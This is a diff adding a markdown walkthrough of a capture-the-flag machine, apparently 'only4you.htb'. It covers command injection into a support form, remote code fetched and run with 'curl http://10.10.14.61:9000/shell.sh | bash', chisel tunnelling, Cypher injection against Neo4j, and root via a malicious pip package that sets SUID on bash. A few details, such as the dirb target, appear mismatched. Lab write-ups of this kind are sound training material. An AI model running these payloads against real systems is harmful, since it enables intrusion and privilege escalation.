@@ -1,0 +1,75 @@
+---
+
+## Initial Reconnaissance
+
+Launch `dirb http://superpass.htb /usr/share/dnsrecon/subdomains-top1mil-5000.txt -N 503` to discover `find beta.only4you.htb`
+
+- **Source Code Analysis**
+
+Download the source code and analyze the code to find that `/download` allows downloading any file with an absolute path. 
+By downloading the file `/etc/nginx/sites-available/default`, the `nginx/sites-available/default` configuration is found. 
+Analyzing the `proxy_pass` directives reveals that both sites are hosted on the same machine but listen on different Unix sockets. 
+Attempt to access the code of the main site located at `/var/www/only4you.htb/app.py`.
+
+- **Exploiting RCE Vulnerability**
+
+Observe that the route `/` is different from the test code. It calls the `sendmessage` function, which contains `status = sendmessage(email, subject, message, ip)`. 
+`sendmessage` in turn calls `run`, with minimal checks, making it vulnerable to RCE (Remote Code Execution): `result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)`.
+
+- **Reverse Shell Payload**
+
+From the home page, intercept the request to send a support request and insert a payload with a reverse shell: `name=test&email=test%40test.it; curl http://10.10.14.61:9000/shell.sh | bash &subject=test&message=test`. 
+The "bash -i ..." command only works if you're already in a shell; otherwise, 'bash -c "bash -i..."' must be added.
+
+## User Files and Chisel
+
+- **Searching for User Files and Chisel Setup**
+
+Search for John's user files (found by doing `ls /home`). 
+`find / -user john 2>/dev/null` discovers there are executable files owned by everyone in `/tmp`: `ls -l run* chi*`.
+[Chisel](https://github.com/jpillora/chisel) is used for further steps.
+
+- **Chisel Setup**
+
+Download chisel locally and start it in server mode. `chisel server --reverse --port 2222`. 
+Locally, create a script similar to `/tmp/runme.sh` but insert your own IP. 
+From the attacked machine, use curl to fetch your script and pipe it to bash to execute: `curl http://10.10.14.61:9000/chisel_tunnel.sh | bash`. This way, the same ports will be exposed locally as well.
+
+## Local Services Analysis
+
+Analyze local services with nmap. `nmap -sV -T4 127.0.0.1`. Some services aren't recognized, but there seems to be HTML code in the response received from nmap. 
+Browse to http://127.0.0.1:7474/. Reading the page reveals that the Neo4j database is on port 7687, which the web app can't connect to. Admin default credentials don't work.
+
+## Neo4j Exploitation
+
+Navigate to http://127.0.0.1:8001. Log in with `admin:admin`. In employees, click the magnifying glass to get the list of employees. Intercept the request in Burp and notice it makes a request to Neo4j.
+
+## Payloads and Enumeration
+
+- **Hacktricks Payloads**
+
+Hacktricks has some payloads to launch against Neo4j: [link](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j#server-version). Launch them URL-encoded and insert your IP in the payload.
+
+- **User Key Enumeration**
+
+Using the payload at [this link](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j#get-properties-of-a-key), you can retrieve values of the user key. 
+One of the last payloads allows enumeration of various collections, but there's only the collection `user` in this case. 
+Retrieve John's password, clearly hashed. `a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6`. Crack it using [CrackStation](https://crackstation.net/): `ThisIs4You`. 
+SSH log in as user john.
+
+## Privilege Escalation
+
+Analyze sudo-executable commands with `sudo -l`. `pip download` is present. 
+Here's how to get code execution through `pip install`: [link](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/). 
+Here's the GitHub repo to automate it: [link](https://github.com/wunderwuzzi23/this_is_fine_wuzzi/tree/main). 
+Set the command to "chmod ugo+s /bin/bash". Compile it with `python -m build`. Install `pip build` if you don't have it. The `.tar.gz` file will be in the "dist" folder.
+
+## Becoming Root
+
+- **Repo Cloning and Root Access**
+
+Clone John's repo locally, visible on Gogs, which run on http://127.0.0.1:3000.
+Get the previously created `.tar.gz` archive from the attacker machine with `wget`. Commit and push it. 
+Use the `sudo` command without a password and become root by downloading the .tar.gz archive from: http://127.0.0.1:3000/john/Test/src/30f47277eedda35f9e5659b4370b9532205ce168/this_is_fine_wuzzi-0.0.1.tar.gz
+
+---
